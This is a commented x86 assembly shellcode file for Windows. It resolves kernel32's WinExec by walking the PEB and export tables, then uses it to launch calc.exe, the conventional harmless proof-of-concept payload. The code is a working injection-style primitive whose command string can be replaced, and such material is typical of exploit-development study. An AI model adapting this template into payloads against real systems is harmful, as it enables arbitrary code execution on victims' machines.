/*
* Executing calc.exe via Shellcode (Windows)
*/

/* Stack Prologue*/
push ebp
push ebx
push ecx
push edx
push esi
push edi
mov ebp, esp
sub esp, 0x18

/* Establish local variables */
xor esi, esi
push esi              /* Null Terminator */
push 0x63             
pushw 0x6578          
push 0x456e6957       /* "WinExec" (Backwards) */
mov [ebp-4], esp      /* char *var4 = "WinExec/x00" */

push esi              /* Null Terminator */
push 0x6578652e
push 0x636c6163
push 0x5c32336d
push 0x65747379
push 0x535c7377
push 0x6f646e69
push 0x575c3a43
mov [ebp-8], esp      /* var8 = "C:\Windows\System32\calc.exe" (without escape characters)*/

/* Get kernel32 Base Address */
xor esi, esi
mov ebx, [fs:0x30 + esi]/* PEB (No zeros) */
mov ebx, [ebx + 0x0c] /* PEB loader data */
mov ebx, [ebx + 0x14] /* First entry of InMemoryOrderModuleList */
mov ebx, [ebx]        /* Second entry (ntdll.dll) */
mov ebx, [ebx]        /* Third entry (kernel32.dll) */
mov ebx, [ebx + 0x10] /* Base address */
mov [ebp-0x0c], ebx      /* varC = kernel32 base address */

/* Get Export, Name Ptr, and Ordinal Tables */
mov eax, [ebx + 0x3c] /* PE sig RVA */
add eax, ebx          /* PE sig Addr */
mov eax, [eax + 0x78] /* Export Table RVA */
add eax, ebx          /* Export Table Addr */

mov ecx, [eax + 0x1c] /* Address Table RVA */
add ecx, ebx          /* Address Table Addr */
mov [ebp-0x10], ecx   /* var10 = Address Table address */

mov edx, [eax + 0x20] /* Name Ptr Table RVA */
add edx, ebx          /* Name Ptr Table Addr */
mov [ebp-0x14], edx   /* var14 = Name Ptr Table address */

mov edi, [eax + 0x24] /* Ordinal Table RVA */
add edi, ebx          /* Ordinal Table Addr */
mov [ebp-0x18], edi   /* var18 = Ordinal Table address */

mov edx, [eax + 0x14] /* Number of exported functions */ 
xor eax, eax          /* Counter = 0 */
cld                   /* Process strings left-to-right */

/* Parse Name Pointer Table */
_loop:
mov edi, [ebp-0x14]   /* Name Ptr Table */
mov esi, [ebp-4]      /* "WinExec" */
xor ecx, ecx
mov edi, [edi + eax*4]/* Name String RVA */
add edi, ebx          /* Start of actual Name String (Base + RVA) */
mov cx, 8             /* Len("WinExec") */
repe cmpsb            /* If strings match, zf=1 */
jz _match

inc eax
cmp eax, edx          /* Check if last function reached */
jb _loop

mov eax, -1           /* Return -1 upon failure */
jmp _leave

_match:
mov ecx, [ebp-0x18]   /* Ordinal Table */
mov edx, [ebp-0x10]   /* Address Table */
mov ax, [ecx + eax*2] /* Ordinal of WinExec Function */
mov eax, [edx + eax*4]/* RVA of WinExec */
add eax, ebx          /* WinExec Address */

/* Execute Calculator */
mov esi, [ebp-8]
push 1
push esi
call eax

/* Stack Epilogue */
_leave:
mov esp, ebp
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop ebp
ret
